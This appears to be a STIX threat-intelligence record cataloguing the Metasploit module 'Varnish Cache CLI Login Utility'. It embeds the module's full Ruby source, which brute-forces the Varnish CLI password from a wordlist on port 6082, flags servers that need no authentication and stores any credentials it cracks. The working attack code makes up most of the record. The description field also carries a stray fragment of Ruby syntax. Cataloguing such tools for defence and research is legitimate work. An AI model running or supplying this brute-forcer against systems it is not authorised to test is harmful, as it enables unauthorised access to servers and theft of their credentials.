{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4414754-c885-4246-a673-473cca6322fa",
    "created": "2024-08-14T16:26:32.03306Z",
    "modified": "2024-08-14T16:26:32.033064Z",
    "name": "Varnish Cache CLI Login Utility",
    "description": "This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce list of passwords.' 'References'     => [ [ 'OSVDB', '67670' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/varnish/varnish_cli_login.rb",
            "external_id": "varnish_cli_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.varnish-cache.org/trac/wiki/CLI"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/varnish'\nrequire 'metasploit/framework/tcp/client'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Metasploit::Framework::Varnish::Client\n\n  def initialize\n    super(\n      'Name'           => 'Varnish Cache CLI Login Utility',\n      'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce\n                           list of passwords.',\n      'References'     =>\n        [\n          [ 'OSVDB', '67670' ],\n          [ 'CVE', '2009-2936' ],\n          [ 'EDB', '35581' ],\n          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]\n        ],\n      'Author'         =>\n        [\n          'aushack', #original module\n          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(6082),\n        OptPath.new('PASS_FILE',  [ true, 'File containing passwords, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n\n    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any\n    # usernames that are passed in.\n    @strip_usernames = true\n  end\n\n  def run_host(ip)\n    # first check if we even need auth\n    begin\n      connect\n      if !require_auth?\n        print_good \"#{ip}:#{rport} - Login Successful: No Authentication Required\"\n        close_session\n        disconnect\n        return\n      else\n        vprint_status \"#{ip}:#{rport} - Authentication Required\"\n      end\n      close_session\n      disconnect\n    rescue Rex::ConnectionError, EOFError, Timeout::Error\n      print_error \"#{ip}:#{rport} - Unable to connect\"\n    end\n\n    cred_collection = Metasploit::Framework::CredentialCollection.new(\n      pass_file: datastore['PASS_FILE'],\n      username: '<BLANK>'\n    )\n    scanner = Metasploit::Framework::LoginScanner::VarnishCLI.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      stop_on_success: true,\n      connection_timeout: 10,\n      framework: framework,\n      framework_module: self,\n\n    )\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential.private}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential.private}\"\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}